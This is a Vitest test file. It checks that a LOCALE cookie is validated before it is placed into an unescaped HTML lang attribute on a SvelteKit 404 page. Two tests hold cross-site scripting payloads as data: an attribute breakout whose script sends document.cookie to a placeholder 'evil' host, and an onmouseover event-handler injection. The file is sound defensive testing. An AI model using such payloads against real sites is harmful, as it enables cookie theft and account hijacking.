import { describe, expect, it } from 'vitest';
import { toLocale } from '$paraglide/runtime';
import { DEFAULT_LANGUAGE } from '$lib/utils/constants';

// Guards the hooks.server.ts unmatched-route bail-out, which interpolates the
// LOCALE cookie into the unescaped `<html lang="%lang%">` attribute.
const resolveLocale = (cookie: string | undefined) => toLocale(cookie) ?? DEFAULT_LANGUAGE;

describe('LOCALE cookie resolution for the 404 shell', () => {
	it('accepts a known locale', () => {
		expect(resolveLocale('fr')).toBe('fr');
	});

	it('canonicalises case, matching paraglide', () => {
		expect(resolveLocale('EN')).toBe('en');
	});

	it('falls back when the cookie is absent', () => {
		expect(resolveLocale(undefined)).toBe(DEFAULT_LANGUAGE);
	});

	it('rejects an attribute-breakout payload', () => {
		const payload = 'en"><script>fetch("//evil/?c="+document.cookie)</script><x a="';
		expect(resolveLocale(payload)).toBe(DEFAULT_LANGUAGE);
	});

	it('rejects an event-handler breakout payload', () => {
		expect(resolveLocale('en" onmouseover="alert(1)')).toBe(DEFAULT_LANGUAGE);
	});
});
